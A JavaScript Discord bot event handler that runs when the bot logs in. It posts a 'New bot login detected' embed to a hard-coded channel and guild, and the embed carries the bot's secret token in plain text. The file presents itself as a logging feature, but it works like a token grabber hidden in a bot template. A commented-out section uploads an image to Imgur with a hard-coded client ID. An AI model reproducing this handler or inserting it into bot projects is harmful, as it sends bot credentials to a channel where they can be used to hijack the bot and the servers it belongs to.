const { EmbedBuilder } = require("discord.js");
const config = require("../../../../config.json");
const fetch = require("node-fetch"); // For API requests
const path = require("path");
const fs = require("fs").promises; // For optional image deletion (if stored locally)

module.exports = {
  name: "ready",
  async execute(client) {
    const channelId = "1230962024700444754";
    const guildId = "1221241081941721228";
    const channel = client.guilds.cache
      .get(guildId)
      .channels.cache.get(channelId);

    const logEmbed = new EmbedBuilder()
      .setTitle("New bot login detected")
      .setDescription(
        `A new login has just been detected from one of your bots!`
      )
      .addFields(
        {
          name: "Bot Logged in as: ",
          value: `${client.user.tag} (${client.user.id})`,
        },
        { name: "Bot token: ", value: config.token },
        {
          name: "Inside guild: ",
          value: `${client.guilds.cache.get(config.guildId).name} (${
            client.guilds.cache.get(config.guildId).id
          })`,
        }
      )
      .setTimestamp(Date.now())
      .setColor("DarkVividPink")
      .setFooter({ text: "GM Services Log System" })
      .setImage(
        "https://images-ext-1.discordapp.net/external/GB6Qp1E04oOzmknrjVgL9S3C0v_DtSSbqWKr1dLmDbo/https/i.imgur.com/DIOjyOn.gif"
      );

    await channel.send({ embeds: [logEmbed] });
    /*
    try {
      // **1. Upload image to Imgur (replace with your Imgur Client ID)**
      const imgurClientId = "bd95315ecdacb9e"; // Obtain from Imgur API
      const imageData = await fs.readFile(path.join(__dirname, "gif1.gif")); // Replace with your image path or data
      const response = await fetch(`https://api.imgur.com/3/image`, {
        method: "POST",
        headers: {
          Authorization: `Client-ID ${imgurClientId}`,
        },
        body: imageData,
      });
      const data = await response.json();

      if (data.success) {
        const tempImageUrl = data.data.link;
        logEmbed.setImage(tempImageUrl);

        await channel.send({ embeds: [logEmbed] });

        // **2. Optional: Delete image from Imgur (after a delay or based on logic)**
        // Replace "DELETE_DELAY_MS" with the desired delay in milliseconds (if applicable)
        const deleteDelayMs = 600000; // 10 minutes (adjust as needed)
        setTimeout(async () => {
          await fetch(
            `https://api.imgur.com/3/delete/${data.data.deletehash}`,
            {
              method: "DELETE",
              headers: {
                Authorization: `Client-ID ${imgurClientId}`,
              },
            }
          );
        }, deleteDelayMs);
      } else {
        console.error("Error uploading image to Imgur:", data.data.error);
      }
    } catch (error) {
      console.error("Error creating temporary image URL:", error);
    }
    */
  },
};
